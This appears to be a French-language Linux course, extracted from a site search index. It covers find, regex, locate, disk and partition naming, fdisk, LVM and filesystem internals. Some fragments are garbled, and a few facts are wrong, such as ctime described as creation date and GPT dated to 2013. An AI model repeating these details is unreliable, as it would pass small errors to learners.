propri\u00e9taire -type [f, d, l, c, b, p] Recherche par type de fichier. les lettres en argument repr\u00e9sentent les divers types de fichiers Unix - size [+-]nb Recherche en fonction de la taille (Possibilit\u00e9 de pr\u00e9ciser k, M ou G). Le caract\u00e8re \u00b1 permet d\u2019indiquer \"plus grand que\" ou \"plus petit que\" -mtime nb Recherche des fichiers sur date de derni\u00e8re modification, nb correspond au nombre de jours (1 pour la veille, 2\u00a0jours avant\u2026) <code>-mtime</code> <code>-ctime</code> <code>-atime</code> <p>Stipule la date de la derniere modification du fichier</p> <p>Stipule la date de cr\u00e9ation du fichier</p> <p>Stipule la date d'acc\u00e8s au fichier</p> recherche <code>find</code> recherche <code>find</code>recherche <code>find + -name</code>recherche <code>find + -size</code>recherche <code>find + -type</code> <pre><code>user30@deb:~$ find . -name \"[Tt]el*\"\n/home/user30/tel2020\n/home/user30/Tel-2018.txt\n/home/user30/perso/tel2018\n/home/user30/perso/tel2020\n/home/user30/perso/tel2019\n/home/user30/Tel-2020\n</code></pre> <pre><code>user30@deb:~$ find . -type d -name \"*test*\"\n./dirtest01\n./perso/dirtest02\n</code></pre> <pre><code>user30@deb:~$ find dirtest01/ -size +500k\ndirtest01/fic1M\ndirtest01/fic10M\nuser30@deb:~$ find dirtest01/ -size -100K\ndirtest01/fic50k\ndirtest01/fichier01.txt\n</code></pre> <pre><code>user30@deb:~$ find dirtest01/ -type f -mtime -1\ndirtest01/ficnew\n</code></pre> <p>Quelques actions r\u00e9alisables par la commande <code>find</code> </p> Action Description <code>-print</code> Affiche le nom complet des fichiers trouv\u00e9s. Il s\u2019agit de l\u2019action par d\u00e9faut. <code>-printf</code> Affiche le r\u00e9sultat avec les possibilit\u00e9s de formatage de la fonction <code>printf</code>du langage C (cf<code>man find</code>) <code>-exec command {} \\;</code> Ex\u00e9cute s\u00e9quentiellement la commande command sur le r\u00e9sultat repr\u00e9sent\u00e9 par {}. Doit se terminer par <code>\\;</code> <code>-ok command {} \\;</code> M\u00eame fonctionnement que, <code>-exec</code>mais avec demande de confirmation \u00e0 chaque ex\u00e9cution. action <code>-exec command {} \\;</code> Exemple 1Exemple 2 <p><pre><code>user30@deb:~$ find . -type f -mtime -1 -exec ls -li {} \\;\n15684 -rw-r--r-- 1 user30 user30   0 ao\u00fbt  10  17:05 ficnew\n</code></pre> Dans cette exemple la commande <code>find</code> permet de chercher dans le dossier courant un fichier de type <code>-type f</code> modifi\u00e9 la veille <code>-mtime -1</code> et d'afficher ce fichier ainsi que son inode <code>-exec ls -li {} \\;</code></p> <p><pre><code>user30@deb:~$ find . -type f -name \"Edition\" -exec cp -v {}.txt \\;\n'./Edition' -&gt; '/tmp/./Edition.txt'\n</code></pre> Dans cette exemple <code>find</code> cherche le fichier standard nomm\u00e9 \"Edition\" dans le r\u00e9pertoire courant puis il va en cr\u00e9er une copie dans le dossier <code>/tmp</code> et ajouter au nom du fichier une extension .txt</p>"},{"location":"Linux/Bash_introduction/#expression-reguliere-regex","title":"Expression r\u00e9guli\u00e8re <code>regex</code>","text":"<p>Les expressions r\u00e9guli\u00e8res (ou regex) sont des s\u00e9quences de caract\u00e8res utilis\u00e9es pour d\u00e9crire un motif de recherche dans du texte. Les expressions r\u00e9guli\u00e8res sont largement utilis\u00e9es dans les commandes et les outils de manipulation de texte sous Linux, tels que grep, sed, awk, etc.  </p> <p>Les expressions r\u00e9guli\u00e8res sont utilis\u00e9es par les outils d\u2019\u00e9dition et de recherche dans les fichiers tels que <code>vi</code>, <code>grep</code>, <code>sed</code>, <code>awk</code>, <code>ed</code>, <code>ex</code> etc. Une expression r\u00e9guli\u00e8re est construite \u00e0 l\u2019aide de diff\u00e9rents caract\u00e8res dot\u00e9s d\u2019une signification particuli\u00e8re.  </p> <p>Les caract\u00e8res d\u2019expression r\u00e9guli\u00e8re auront cette syntaxe : <code>regex</code> avec une syntaxe en bleu Les caract\u00e8res normaux utiliseront celle-ci: <code>caract\u00e8re</code> avec une syntaxe en violet  </p>"},{"location":"Linux/Bash_introduction/#les-quantificateurs","title":"Les quantificateurs","text":"<p>Ils agissent sur les caract\u00e8res qui les pr\u00e9c\u00e8dent, Certains caract\u00e8res, vus dans la section sur les m\u00e9tacaract\u00e8res, ne s\u2019utilisent plus de la m\u00eame mani\u00e8re  </p> <p> Quantificateurs </p> <code>*</code> <code>\\+</code> <code>\\?</code> <p>R\u00e9p\u00e9tition du caract\u00e8re qui pr\u00e9c\u00e8de de 0 \u00e0 n fois <code>a*</code> correspond \u00e0:  ou <code>a</code> ou <code>aa</code> ou <code>aaa</code> ... <p>R\u00e9p\u00e9tition du caract\u00e8re qui le pr\u00e9c\u00e8de de 1 \u00e0 n fois <code>a\\+</code> correspond \u00e0: <code>a</code> ou <code>aa</code> ou <code>aaa</code> ...</p> <p>Correspond \u00e0 0 ou 1 fois le caract\u00e8re pr\u00e9c\u00e9dent <code>a\\?</code> correspond \u00e0  ou <code>a</code>  quantificateurs  <code>car\\{m,M\\}</code><code>car\\{n,\\}</code><code>car\\{n\\}</code> <p>un caracy\u00e8re r\u00e9p\u00e9t\u00e9 au minimum <code>m</code> fois et au maximum <code>M</code> fois <code>ab\\{1,3\\}c</code> correspond \u00e0: <code>abc</code> ou <code>abbc</code> ou <code>abbbc</code></p> <p>un caract\u00e8re r\u00e9p\u00e9t\u00e9 au minimum 'n' fois <code>es\\{2,\\}ai</code> correspond \u00e0: <code>essai</code>, mais aussi \u00e0 <code>esssai</code>, <code>essssai</code></p> <p>un caract\u00e8re r\u00e9p\u00e9t\u00e9 'n' fois exactement <code>[A-Z]\\{3\\}</code> correspond \u00e0 une chaine de caract\u00e8res compos\u00e9e de 3 majuscules</p>"},{"location":"Linux/Bash_introduction/#commande-locate","title":"Commande <code>locate</code>","text":"<p>Commande cherchant les \u00e9l\u00e9ments au sein d\u2019une base de donn\u00e9es et non sur un disque. Base de donn\u00e9es ou sont index\u00e9 tous les fichiers pr\u00e9sents sur les filesystem Linux.  </p> <p>Locate</p> <p>La commande <code>locate</code> n\u00e9cessite une base de donn\u00e9e \u00e0 jour Voila pourquoi un fichier peut etre introuvable directement apr\u00e8s sa cr\u00e9ation La base de donn\u00e9e met g\u00e9n\u00e9ralement quelques sec/min \u00e0 s'actualiser Dans le cas contraire l'utilisateur root peut forcer la mise a jour via la commande <code>updatedb</code></p> commande <code>locate</code> Exemple commande <code>locate</code>Explication <pre><code>#1 user30@deb:~$ touch explocate\n#2 user30@deb:~$ locate explocate\n\n#3 root@deb:~# updatedb\n\n#4 user30@deb:~$ locate explocate\n#5 /home/user30/explocate\n</code></pre> <p>1 - cr\u00e9ation d'un fichier \"explocate\" 2 - recherche du fichier via la commande <code>locate</code>     la commande ne retourne rien car elle ne connait pas le fichier  </p> <p>3 - utilisateur root force la mise a jour de la base de donn\u00e9e via la commande <code>updatedb</code> </p> <p>4 - utilisateur simple relance la commande <code>locate</code> 5 - la commande retourne l'emplacement du fichier car elle sait maintenant ou il se trouve  </p>"},{"location":"Linux/Espace_stockage/","title":"Le Stockage","text":""},{"location":"Linux/Espace_stockage/#gestion-des-espaces-de-stockage","title":"Gestion des espaces de stockage","text":"<p>Un disque dur est r sous linux par un p\u00e9riph\u00e9rique de type bloc Le syst\u00e8mes de fichiers par d\u00e9faut est ext4 Afin de comprendre comment Linux pr\u00e9sentera ce p\u00e9riph\u00e9rique et ses sous division (ses partitions)  </p>"},{"location":"Linux/Espace_stockage/#la-norme-intel-du-mbr","title":"La norme Intel du MBR","text":"<p>Le MBR (Master Boot Record cr\u00e9e en 1983) est constitu\u00e9 de 2 principaux \u00e9l\u00e9ments:  </p> <ul> <li>Le boot loader: 446 premiers octets - Sous Linux il contient le stage 1 de GRUB</li> <li>La table de partition: 64 octets, contient la position des 4 partitions primaires</li> </ul> <p>La partition primaire ou principales: C'est le type de partition le plus utilis\u00e9 et qui permet de stocker des donn\u00e9es. en MBR, on peut cr\u00e9er maximum 4 partitions par disques. La partition \u00e9tendue: On utilise ce type de partition pour pouvoir d\u00e9passer la limite des 4 partitions principales, elle pourra stocker les informations de 56 partitions logiques maximum  </p> <p>La plus grosse probl\u00e9matique du MBR est la taille limite des partitions fix\u00e9e au maximum \u00e0 2,2To  </p>"},{"location":"Linux/Espace_stockage/#la-norme-intel-du-gpt","title":"La norme Intel du GPT","text":"<p>Partitions EFI: c'est la partition de d\u00e9marrage pour les disques GPT sur les PC UEFI. Elle est format\u00e9 en FAT32 et stocke le firmware EFI Le GPT (GUID Partition Table) est cr\u00e9e en (1993?) 2013, il est le remplacant du MBR Le nombre maximum de partitions est fix\u00e9 \u00e0 128 (voire 256) La limite th\u00e9orique des partitions et des disques est de 9,4Zo (Zeta octet)  </p>"},{"location":"Linux/Espace_stockage/#nommage-des-disques-sous-linux","title":"Nommage des disques sous Linux","text":"<p>Sur n'importe quelle distribution Linux les partitions de disque ne sont pas num\u00e9rot\u00e9s comme sur Windows. En effet, pour identifier un disque, Linux utilise des lettres \u00e0 la place des chiffres. Linux cr\u00e9e et monte les p\u00e9riph\u00e9riques dans /dev </p> <p>Voici la liste des principaux type de p\u00e9riph\u00e9riques de stockage. Par exemple, si votre syst\u00e8mes comporte 2 disques:  </p> type de p\u00e9riph\u00e9rique Nom /dev Disque SATA ou SCSI /dev/sda Stockage NVME /dev/nvme0n1 Disque IDE /dev/hda DVD ou CD-ROM /dev/scd0, /dev.sr0 ou /dev/cdrom SD card et carte Flash /dev/mmcblkX <p>On obtient donc le nommage suivant dans le cas de plusieurs disque SATA dans une m\u00eame machine :  </p> <ul> <li>/dev/sda = Disque 0</li> <li>/dev/sdb = Disque 1</li> <li>/dev/sdc = Disque 2</li> </ul> <p>On trouvera la m\u00eame logique pour des disques NvME :  </p> <ul> <li>/dev/nvme0n1</li> <li>/dev/nvme0n2</li> <li>...</li> </ul>"},{"location":"Linux/Espace_stockage/#nommage-des-partitions","title":"Nommage des partitions","text":"<p>Pour les partition Linux utilisera cette fois ci des chiffres, afin de differencier les differentes partitions cr\u00e9e au sein d'un m\u00eame disque.  </p> <p>Par contre Linux ne nomme pas les partitions \u00e0 la suite Il va r\u00e9server les chiffres 1 \u00e0 4 pour les partitions primaire (principales et \u00e9tendue) Ainsi queleque sois le nombre de partitions principales, si une partition \u00e9tendue est cr\u00e9e les paritions logiques commenceront quoiqu'il arrive \u00e0 5</p> <p>Exemple: le deuxi\u00e8me disque du syst\u00e8me est partitionn\u00e9 avec 2 partitions principales et une partition \u00e9tendue contenant 3 partitions logiques. Linux pr\u00e9sentera tout cela de cette fa\u00e7on:  </p> partition principale partition \u00e9tendue /dev/sdb disque entier /dev/sdb3 disque entier /dev/sdb1 1ere partition /dev/sdb5 1ere partition logique /dev/sdb2 2eme partition /dev/sdb6 2eme partition logique /dev/sdb7 3eme partition logique <p>Dans ce cas /devsdb &amp; /dev/sdb3 ne sont pas utilisable il s'agit de conteneurs (pool) pour les partitions li\u00e9.</p> <p>Quelque exemple de nommage de partition selon les types de disque:  </p> SATA NVME IDE Disque:    /dev/sda /dev/nvme0n1 /dev/hda Partition: /dev/sda1 /dev/nvme0n1p1 /dev/hda1 Partition: /dev/sda2 /dev/nvme0n1p2 /dev/hda2"},{"location":"Linux/Espace_stockage/#outil-de-partitionnement","title":"Outil de partitionnement","text":"<p>Plusieurs outils sont utilisables en console ou en mode graphique pour la gestion des partitions Les plus courant sont fdsisk, parted et gparted en version graphique...</p>"},{"location":"Linux/Espace_stockage/#la-commande-fdisk","title":"La commande <code>fdisk</code>","text":"<p>L'utilisation de <code>fdisk</code> est basique mais relativement efficace Nous allons voir les \u00e9tapes importante mise a disposition parmis toutes les options disponible  </p> <p><code>fdisk</code> est l'outil utilis\u00e9 pour le partitionnement des disques  </p> <p><code>fdisk [option] &lt;p\u00e9riph\u00e9rique de stockage&gt;</code> </p> <p><code>-l</code> affiche la table de partition du p\u00e9riph\u00e9rique  </p> <pre><code>root@deb\n:~# fdisk l / sda\nDisque /dev/\nsda : 20 GiB , 21474836480 octets, 41943040 secteurs\nUnit\u00e9s : secteur de 1 \u00d7512 = 512 octets\nTaille de secteur (logique / physique) : 512 octets / 512 octets\ntaille d'E/S (minimale / optimale) : 512 octets / 512 octets\nType d'\u00e9tiquette de disque : dos\nIdentifiant de disque : 0x732e6aa1\nP\u00e9riph\u00e9rique Amor\u00e7age D\u00e9but Fin Secteurs Taille Id Type\n/dev/sda1 * 2048 499711 497664 243M 83 Linux\n/dev/sda2 501758 41940991 41439234 19,8G 5 \u00c9tendue\n</code></pre> <p>En ne rentrant que [-l] la commande renverra les informations de tous les disques connus du syst\u00e8me.  </p>"},{"location":"Linux/Espace_stockage/#exemple-de-creation-dune-partition","title":"Exemple de cr\u00e9ation d'une partition","text":"<p>Pour passer en mode \u00e9dition de la table des partitions d'un disque  </p> <p>La commande sera <code>fdisk + &lt;chemin_du_disque&gt;</code> </p> <p>Dans l'exemple ci-dessous la commande <code>fdisk</code> porte le disque /dev/sdb en premier lieu ici il s'agit de l'affichage de l'aide de la commande.  </p> <pre><code>root@deb:~# fdisk /dev/sdb\nBienvenue dans fdisk util linux 2.29.2).\nLes modifications resteront en m\u00e9moire jusqu'\u00e0 \u00e9criture.\nSoyez prudent avant d'utiliser la commande d'\u00e9criture.\n\nCommande (m pour l'aide) : m\n[...]\nn ajouter une nouvelle partition\np afficher la table de partitions\nt modifier le type d'une partition\n[...]\nw \u00e9crire la table sur le disque et quitter\nq quitter sans enregistrer les modifications\n</code></pre> <p>Lors de la cr\u00e9ation d'une partition <code>fdisk</code> propose soit une partition primaire ou \u00e9tendu, si une parti \u00e9tendue a \u00e9t\u00e9 cr\u00e9e fdisk proposera automatiquement une partition logique puis le num\u00e9ro attendu.</p> <p>le systeme proposera le bloc de d\u00e9but, le premier secteur, ainsi que la taille de la partition (saisie en bloc par d\u00e9faut) il sera possible de pr\u00e9ciser la taille voulu en stipulant un \"+\" + \"la taille\" + \"unit\u00e9 voulu\".  </p> <pre><code>root@deb:~# fdisk /dev/sdb\nCommande (m pour l'aide) : n\nType de partition\np primaire (0 primaire, 0 \u00e9tendue, 4 libre)\ne \u00e9tendue (conteneur pour partitions logiques)\nS\u00e9lectionnez (p par d\u00e9faut) : p\nNum\u00e9ro de partition (1\n4, 1 par d\u00e9faut) :\nPremier secteur (2048\n62914559, 2048 par d\u00e9faut) :\nDernier secteur, +secteurs ou +taille{K,M,G,T,P} (2048\n62914559, 62914559 par d\u00e9faut) : +20G\n</code></pre> <p>Une nouvelle partition 1 de type Linux et de taille 20GiB a \u00e9t\u00e9 cr\u00e9\u00e9e. la commande p (print) permet de la visualiser. a ce stade la partition n'est pas encore \u00e9crit et valid\u00e9 tant que <code>w</code> n'as pas \u00e9t\u00e9 saisie afin de quitter et enregistrer  </p> <pre><code>Commande (m pour l'aide) : p\nDisque /dev/sdb : 30 GiB, 32212254720 octets, 62914560secteurs\nUnit\u00e9s : secteur de 1 \u00d7 512 = 512 octets\nTaille de secteur (logique / physique) : 512 octets / 512octets\ntaille d'E/S (minimale / optimale) : 512 octets / 512octets\nType d'\u00e9tiquette de disque : dos\nIdentifiant de disque : 0x0ab85bf5\nP\u00e9riph\u00e9rique Amor\u00e7age D\u00e9but Fin Secteurs Taille Id Type\n/dev/sdb1 2048 41945087 41943040 20G 83 Linux\n</code></pre> <p>Une fois les partitions cr\u00e9\u00e9es, il ne faut pas oublier de d\u00e9finir le type de partition via la commande <code>t</code> (type). Cela est important afin de d\u00e9finir le type de syst\u00e8me de fichier sera install\u00e9 sur la partition  </p> <p>(l'exemple ci-dessous ne reprend pas l'int\u00e9gralit\u00e9 des types de fichiers)  </p> <p>Les 2 plus importants sont :</p> <ul> <li>83 Linux : Partition Linux native : type automatique lors de la cr\u00e9ation d'une partition</li> <li>8e Linux LVM : Partition Linux LVM</li> </ul> <pre><code>Commande (m pour l'aide) : t\nPartition 1 s\u00e9lectionn\u00e9e\nCode Hexa (taper L pour afficher tous les codes) :L\n0 Vide              24 NEC DOS          81 Minix / Linux a\n1 FAT12             27 TFS WinRE masqu  82 partition d' \u00e9ch\n2 root XENIX        39 Plan 9           ***83 Linux***\n3 usr XENIX         3c r\u00e9cup\u00e9ration Pa  84 OS/2 cach\u00e9e\n4 FAT16 &lt;32M        40 Venix 80286      85 Linux\n5 \u00c9tendue           41 PPC PReP Boot    86 NTFS volume set\n6 FAT16             42 SFS              87 NTFS volume set\n7 HPFS/NTFS/exFAT   4d QNX4.x           88 Linux plaintext\n8 AIX               4e 2e partie QNX4.  8e Linux LVM\n</code></pre> <p>L'enregistrement des modifications se fait via la commande <code>w</code> </p> <p>Si les modifications ne conviennent il est possible de quitter sans enregistrer les modifications via la commande <code>q</code>.  </p> <pre><code>Commande (m pour l'aide) : w\nLa table de partitions a \u00e9t\u00e9 alt\u00e9r\u00e9e.\nAppel d'ioctl() pour relire la table de partitions.\nSynchronisation des disques.\nroot@deb:~#\n</code></pre>"},{"location":"Linux/Espace_stockage/#gestion-des-espaces-de-stockage-avancee","title":"Gestion des espaces de stockage avanc\u00e9e","text":""},{"location":"Linux/Espace_stockage/#presentation-de-lvm","title":"Pr\u00e9sentation de LVM","text":"<p>Le LVM permet de s'affranchir des limites physiques des p\u00e9riph\u00e9riques. LVM impl\u00e9mente une couche logique pour une gestion plus souple et plus \u00e9volutive des volumes de stockage Ce syst\u00e8me implemente une couche logique par dessus le stockage standard ce qui permet une gestion plus souple et beaucoup plus \u00e9volutive On g\u00e8re plusieurs types d'\u00e9l\u00e9ments:  </p> <ul> <li>Les volumes physiques (PV): d\u00e9signent les p\u00e9riph\u00e9riques physique int\u00e9gr\u00e9s dans LVM (les disques durs r\u00e9ellement pr\u00e9sent dans la machine)</li> <li>Les groupes de volumes (VG): permettent de regrouper les volumes physiques  </li> <li>Les volumes logiques (LV): d\u00e9signent les unit\u00e9s d\u00e9finies au sein des groupes de volumes, d\u00e9fini les partitions la ou nous allons r\u00e9ellement cr\u00e9er un syst\u00e8mes de fichier  </li> </ul> <p>La cr\u00e9ation d'un ou plusieurs groupes de volumes sera faite \u00e0 partir des volumes physiques (partitions) disponibles. Les groupes de volumes seront ensuite d\u00e9coup\u00e9s en volumes logiques. Ces volumes logiques pourront alors \u00eatre utilis\u00e9s comme n'importe quel volume de stockage  </p> <p>Les commandes de gestion s'organisent autour de ces d\u00e9nominations et respectent toujours la m\u00eame logique. Pour la cr\u00e9ation, on aura par exemple:</p> <ul> <li>pvcreate: cr\u00e9ation des volumes physiques</li> <li>vgcreate: cr\u00e9ation des groupes de volumes</li> <li>lvcreate: cr\u00e9ation des volumes logiques</li> </ul> <p>Il en sera de m\u00eame pour toutes les autres directives : display, extend, reduce, remove ...  </p> <p>Toutes les commandes LVM sont \u00e9galement disponibles dans un shell d\u00e9di\u00e9, accessible avec la commande <code>lvm</code></p>"},{"location":"Linux/Espace_stockage/#afficher-les-informations-lvm","title":"Afficher les informations LVM","text":"<p>Plusieurs commandes sont disponibles pour obtenir des informations sur les volumes LVM configur\u00e9s  </p> <p>On peut les regrouper en deux \"familles\"  </p> <ul> <li>Informations r\u00e9sum\u00e9es avec \"s\": pvs, vgs, lvs</li> <li>Informations d\u00e9taill\u00e9es avec \"display\": pvdisplay, vgdisplay, lvdisplay</li> </ul>"},{"location":"Linux/Espace_stockage/#afficher-les-informations-resumees-sur-tous-les-groupes-de-volumes","title":"Afficher les informations r\u00e9sum\u00e9es sur tous les groupes de volumes:","text":"<pre><code>root@deb:~# vgs\nVG          #PV     #LV     #SN     Attr    VSize       VFree\nvggroup1    4       5       0       wz n    25,76g      22,26g\nvggroup2    1       1       0       wz n    5g          4g\n</code></pre> <ul> <li>PV : Partition de disque </li> <li>LV : Volume Logique</li> <li>Vsize : Taille compl\u00e8te du groupe</li> <li>Vfree : Taille libre sur le groupe</li> </ul>"},{"location":"Linux/Espace_stockage/#afficher-les-info-detaillees-sur-tous-les-groupes-de-volumes","title":"Afficher les info d\u00e9taill\u00e9es sur tous les groupes de volumes","text":"<pre><code>root@deb:~# vgdisplay\n</code></pre>"},{"location":"Linux/Espace_stockage/#afficher-les-infos-detaillees-sur-un-groupe-de-volumes","title":"Afficher les infos d\u00e9taill\u00e9es sur un groupe de volumes","text":"<p>Permet de voir les informations d\u00e9taill\u00e9e d'un groupe en particulier</p> <pre><code>root@deb:~# vgdisplay vggroup2\n--- Volume group ---\nVG Name             vggroup2\nSystem ID\nFormat              lvm2\n[...]\nCur LV              1\nCur PV              1\n[...]\nVG Size             5 GiB\nPE Size             4,00 MiB\nTotal PE            20480\nAlloc PE / Size     256 / 1 GiB\nFree PE / Size      20224 / 5056,00 MiB\nVG UUID             sJd23F-75eY-fdsJ-Gp2w-ezfQ-PLy1-jmQjVb\n</code></pre>"},{"location":"Linux/Espace_stockage/#afficher-les-infos-resumees-sur-tous-les-volumes-logiques","title":"Afficher les infos r\u00e9sum\u00e9es sur tous les Volumes Logiques","text":"<pre><code>root@deb:~# lvs\nLV          VG          Attr        LSize     Pool     Origin\nlv1         vggroup1    -wi-ao----  3,50g\nlv2         vggroup1    -wi-ao----  1,00g\n</code></pre>"},{"location":"Linux/Espace_stockage/#afficher-les-infos-detaillees-sur-tous-les-volumes-logiques","title":"Afficher les infos d\u00e9taill\u00e9es sur tous les Volumes Logiques","text":"<pre><code>root@deb:~# lvdisplay\n</code></pre>"},{"location":"Linux/Espace_stockage/#afficher-les-informations-detaillees-sur-un-volume-logique","title":"Afficher les informations d\u00e9taill\u00e9es sur un Volume Logique","text":"<pre><code>root@deb:~# lvdisplay /dev/vggroup1/lv2\n--- Logical volume ---\nLV Path                 /dev/vggoup1/lv2\nLV Name                 lv2\nVG Name                 vggroup1\nLV UUID                 V2HdqC-zM80-juKd-51QA-A8mp-pYhX-z35OQJ\nLV Write Access         read write\n[...]\nLV Size                 1 GiB\n[...]\n</code></pre>"},{"location":"Linux/Espace_stockage/#creation-des-lvm","title":"Cr\u00e9ation des LVM","text":"<p>D\u00e9finir l'identifiant des partitions \u00e0 utiliser avec <code>fdisk</code>, utiliser l'ID 8e-Linux LVM: Tr\u00e8s important afin que le syst\u00e8me reconnaisse le syst\u00e8me LVM au prochain red\u00e9marrage  </p> <pre><code>Device     Boot    Start End     blocks      Id System\n/dev/sdb1  1       486     3903763+          8e Linux LVM\n</code></pre>"},{"location":"Linux/Espace_stockage/#creer-des-volumes-physiques-pvcreate","title":"Cr\u00e9er des volumes physiques: pvcreate","text":"<p><code>pvcreate &lt;chemin_des_disques_a_creer&gt;</code> </p> <p>La commande <code>pvcreate</code> suivie des chemins du/ou des divers disques qui devront \u00eatre d\u00e9clar\u00e9s comme PV Dans l'exemple suivant nous avons donc 4 disques sdb1, sdb2, sdb3 et un disque entier sdd </p> <pre><code>root@deb\n:~# pvcreate /dev/sdb1 /dev/sdb2 /dev/sdc1 /dev/sdd\n</code></pre> <p></p>"},{"location":"Linux/Espace_stockage/#creer-des-volumes-groups-vgcreate","title":"Cr\u00e9er des volumes groups: vgcreate","text":"<p><code>vgcreate &lt;nom_du_vggroupe&gt; + &lt;chemin_des_disques_a_ajouter&gt;</code> </p> <p>Pour la cr\u00e9ation d'un groupe de volume, il faudra utiliser la commande <code>vgcreate</code> suivie du nom du groupe et des disques devant \u00eatre inclus dans le VG</p> <pre><code>root@deb:~# vgcreate vggroup1 /dev/sdb1 /dev/sdb2 /dev/sdc1\n</code></pre> <p></p> <p>Il est impossible d'ajouter un PV \u00e0 2 VG 1 PV = 1VG</p>"},{"location":"Linux/Espace_stockage/#creer-des-volumes-logiques-lvcreate","title":"Cr\u00e9er des volumes logiques: lvcreate","text":"<p><code>lvcreate [-n - L]</code></p> options description <code>-n</code> nom du volume logique <code>-L</code> [taille] K/M/G/T/E (Ko, Mo, Go ...) <pre><code>root@deb:~# lvcreate -n lv1 -L 2G vggroup1\n</code></pre> <p> </p> <p>Un LV pourra avoir, au maximum la taille disponible du VG, Si cela n'est pas le cas, la taille restante du VG sera disponible pour d'autre LV ou pour \u00e9tendre les LV d\u00e9j\u00e0 existants.  </p> <p>Manipuler les volumes logiques</p> <p>Il y aura 2 chemins possible :  </p> <code>/dev/vgsystem/lvhome</code> <p>ou</p> <code>/dev/mapper/vgsystem-lvhome</code>"},{"location":"Linux/Espace_stockage/#modifier-des-lvm","title":"Modifier des LVM","text":""},{"location":"Linux/Espace_stockage/#ajouter-des-volumes-physiques-au-vg-vgextend","title":"Ajouter des volumes physiques au VG: vgextend","text":"<p>il faudra ajouter a la commande <code>vgextend</code> le nom du vggroup que l'on souhaite \u00e9tendre, suivi du nom du disque que l'on souhaite ajouter  </p> <pre><code>root@deb:~# vgextend vggroup1 /dev/sdd\n</code></pre>"},{"location":"Linux/Espace_stockage/#agrandirreduire-des-volumes-logiques-lvextend-lvreduce","title":"Agrandir/R\u00e9duire des volumes logiques: lvextend &amp; lvreduce","text":"<p>\u00c0 noter que les commandes lvreduce et lvextend s'utilisent de la m\u00eame mani\u00e8re. Seul lvextend sera d\u00e9taill\u00e9e ici  </p> <pre><code>root@deb:~# lvextend -rL +512M /dev/vggroup1/lv1\nroot@deb:~# lvextend -rL 1G /dev/vggroup1/lv2\n</code></pre> <ul> <li>[-r]: invoque automatiquement <code>resize2fs</code> </li> <li>[-L]: [+] K | M | G | T | E       ne pas mettre de signe '+' permet de \"fixer\" une taille de disque, peu importe sa taille initiale ex: dans l'exemple pr\u00e9c\u00e9dent on fixe la taille du volume \u00e0 1Go si celui-ci fait 2Go il y aura donc 1Go d'utiliser et 1Go de disponiblecd /dev <p>Le syst\u00e8me de fichier ne prendra pas en compte automatiquement ces changements Il faudra forcer un redimensionnement-n lv pour pouvoir utiliser tout l'espace  </p>"},{"location":"Linux/Espace_stockage/#ajout-de-disque-sur-une-machine","title":"Ajout de disque sur une machine","text":"<p>Apr\u00e8s l'ajout d'un disque et que celui-ci n'est pas d\u00e9tect\u00e9, on peut suivre cette proc\u00e9dure:  </p> <ol> <li>apr\u00e8s cette logger en <code>su -</code></li> <li>taper <code>udevadm info --query=path --name=sda</code> cela permet d'afficher l'h\u00f4te utilis\u00e9 pour monter les disques</li> <li><code>echo \"- - -\" &gt; /sys/class/scsi_host/host2/scan</code> permet de relancer un scan sur le ou les bus des disques durs</li> <li>relance une commande <code>fdisk /dev/sd[le_nom_de_votre_disque]</code></li> </ol>"},{"location":"Linux/Espace_stockage/#file-system","title":"File System","text":""},{"location":"Linux/Espace_stockage/#considerations-generales-sur-les-systemes-de-fichiers","title":"Consid\u00e9rations g\u00e9n\u00e9rales sur les syst\u00e8mes de fichiers","text":"<p>Tous les syst\u00e8mes de fichiers de type Unix sont bas\u00e9s sur le m\u00eam principe et les m\u00eames \u00e9l\u00e9ments \u00e9l\u00e9mentaires. Les syst\u00e8mes de fichiers Unix sont segment\u00e9s en bloc de donn\u00e9es, actuellement \u00e0 4Ko par d\u00e9faut  </p> <p>Chaque bloc pourra avoir diff\u00e9rentes structures:</p> <ul> <li>Superbloc: bloc contenant les informations vitales du syst\u00e8me de fichiers</li> <li>Inode: bloc contenant les inodes contenant les informations d'un fichier</li> <li>Bloc d'indirection: bloc redirigeant cers d'autres blocs</li> <li>Bloc de donn\u00e9es: bloc contenant les donn\u00e9es r\u00e9elles du fichier (ce qui est r\u00e9ellement \u00e9crit dans le fichier)</li> <li>Table des inodes: bloc contenant la liste des blocs d'inodes</li> <li>Table des inodes libres: bloc contenant la liste des inodes libres</li> <li>Table des blocs libres: bloc contenant la liste des blocs de donn\u00e9es libre</li> </ul>"},{"location":"Linux/Espace_stockage/#superbloc","title":"Superbloc","text":"<p>Il contient les informations vitales du syst\u00e8me de fichiers. Donc par mesure de s\u00e9curit\u00e9, il est dupliqu\u00e9 \u00e0 diff\u00e9rents endroits du syt\u00e8me de fichiers. Il contient les informations suivantes:</p> <ul> <li>Taille des blocs</li> <li>Taille du syst\u00e8me de fichiers</li> <li>Nombre de montages effectu\u00e9s</li> <li>Nombre maximum de montages avant v\u00e9rification avant le passage d'un fsck (\u00e9quivalent au \"checkdisk\" windows)</li> <li>Date de dernier montage</li> <li>Intervalle maximum entre deux montages avant v\u00e9rification</li> <li>Un pointeur vers l'inode racine du syst\u00e8me de fichier</li> </ul>"},{"location":"Linux/Espace_stockage/#inodes-et-bloc-dindirection","title":"Inodes et bloc d'indirection","text":"<p>Les inodes sont regroup\u00e9s par bloc dans un syst\u00e8me de fichiers. La taille d'un inode est de 128 octets. Avec des blocs de 4Ko, il y aura 32 inodes par bloc d'inodes. Un inode contient des informations propres au fichier qu'il repr\u00e9sente :</p> <ul> <li>Type de fichier: -, d, b, c, l, p, s</li> <li>[-] standard</li> <li>[d] dossier</li> <li>[b] p\u00e9riph\u00e9rique type bloc (partition, disque dur, volume logique, un clavier, une souris ...)</li> <li>[l] lien symbolique</li> <li>[p] pipe</li> <li>[s] socket</li> <li>Mode ou droit d'acc\u00e8s: en octal, ex. 0644 (rw-r--r--)</li> <li>Nombre de liens physiques: si la valeur tombe \u00e0 z\u00e9ro, le fichier est consid\u00e9r\u00e9 comme supprim\u00e9 et l'inode rejoint la table des inodes libres</li> <li>UID: propri\u00e9taire du fichier</li> <li>GID: groupe propri\u00e9taire du fichier</li> <li>Taille du fichier: en octets</li> <li>Champs date:</li> <li>atime dernier acc\u00e8s au fichier</li> <li>ctime dernier changement des informations de l'inode</li> <li>mtime dernier changement de donn\u00e9es r\u00e9elles du fichier</li> <li>15 addresses: pointant vers les blocs de donn\u00e9es r\u00e9elles du fichier</li> </ul> <p>Attention!</p> <p>L'inode ne poss\u00e8de pas le nom du fichier, Celui-ci est renseign\u00e9 dans le r\u00e9pertoire contenant ce 